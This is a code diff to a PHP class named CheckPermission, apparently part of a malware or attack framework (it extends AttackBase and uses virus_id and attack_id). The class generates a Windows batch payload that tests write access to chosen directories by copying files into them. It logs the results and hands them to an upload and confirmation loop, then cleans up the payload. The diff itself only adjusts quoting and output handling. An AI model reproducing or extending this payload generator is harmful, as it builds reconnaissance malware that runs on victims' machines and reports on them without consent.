@@ -62,19 +62,19 @@ class CheckPermission extends AttackBase {
         }
     }
 
-    public function generateBatchCode(): string {
-        ob_start(); //@formatter:off
+    public function generateBatchCode(): void {
+        //@formatter:off
         $hash = hash("sha256", rand()); ?>
         SetLocal EnableDelayedExpansion
         chCp 65001
-        echo _>%~pd0perm
-        echo _>%~pd0temp
+        echo _>"%~pd0perm"
+        echo _>"%~pd0temp"
         <?php
         foreach ($this->directories as $index => $value) { $path = $value["path"]; ?>
         if not exist "<?php echo $path; ?>" (echo <?php echo $index; ?>;<?php echo self::$PERMISSION_DOES_NOT_EXIST ?>; >> %~pd0perm) else (
-            copy %~pd0temp "<?php echo $path; ?>\<?php echo $hash; ?>"
-            if "!errorLevel!" == "1" (echo <?php echo $index; ?>;<?php echo self::$PERMISSION_NOT_ALLOWED; ?>; >> %~pd0perm) else (
-                echo <?php echo $index; ?>;<?php echo self::$PERMISSION_ALLOWED; ?>; >> %~pd0perm
+            copy "%~pd0temp" "<?php echo $path; ?>\<?php echo $hash; ?>"
+            if "!errorLevel!" == "1" (echo <?php echo $index; ?>;<?php echo self::$PERMISSION_NOT_ALLOWED; ?>; >> "%~pd0perm") else (
+                echo <?php echo $index; ?>;<?php echo self::$PERMISSION_ALLOWED; ?>; >> "%~pd0perm"
                 del "<?php echo $path; ?>\<?php echo $hash; ?>"
             )
         )
@@ -82,7 +82,7 @@ class CheckPermission extends AttackBase {
         :end_payload
         <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
         echo BaseScriptWin::cleanUpPayload();
-        return ob_get_clean(); //@formatter:on
+        //@formatter:on
     }
 
     private function generateUploadCode(): string {
